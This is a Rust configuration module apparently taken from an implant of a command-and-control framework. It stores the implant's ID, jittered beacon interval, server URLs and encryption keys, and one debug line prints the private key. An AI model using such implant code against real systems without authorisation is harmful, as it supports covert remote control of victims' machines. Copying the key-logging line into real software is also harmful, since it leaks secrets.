use malefic_core::config::{INTERVAL, JITTER, URLS};
use malefic_helper::debug;

pub struct MetaConfig {
    uuid: [u8; 4],
    pub interval: u64,
    pub jitter: f64,
    pub urls: Vec<String>,
    #[cfg(feature = "secure")]
    pub private_key: String,  // implant自己的私钥，用于解密server发来的数据
    #[cfg(feature = "secure")]
    pub server_public_key: String,  // server的公钥，用于加密发送给server的数据
}

impl MetaConfig {
    pub fn new(uuid: [u8; 4]) -> Self {
        MetaConfig {
            uuid,
            interval: INTERVAL.clone(),
            jitter: JITTER.clone(),
            urls: URLS.clone(),
            #[cfg(feature = "secure")]
            private_key: malefic_core::config::AGE_PRIVATE_KEY.clone(),
            #[cfg(feature = "secure")]
            server_public_key: malefic_core::config::AGE_PUBLIC_KEY.clone(),
        }
    }

    pub fn set_id(&mut self, uuid: [u8; 4]) {
        self.uuid = uuid;
    }
    pub fn update(&mut self, interval: u64, jitter: f64) {
        self.interval = interval;
        self.jitter = jitter;
    }

    pub fn update_urls(&mut self, urls: Vec<String>) {
        self.urls = urls;
    }

    pub fn new_heartbeat(&self) -> u64 {
        malefic_proto::new_heartbeat(self.interval, self.jitter)
    }
    pub fn get_uuid(&self) -> [u8; 4] {
        self.uuid
    }

    /// Get implant's private key for decrypting server data
    pub fn get_decrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.private_key.is_empty() {
                None
            } else {
                debug!("get decrypt key: {}", self.private_key);
                Some(&self.private_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

    /// Get server's public key for encrypting data to server
    pub fn get_encrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.server_public_key.is_empty() {
                None
            } else {
                Some(&self.server_public_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }
}
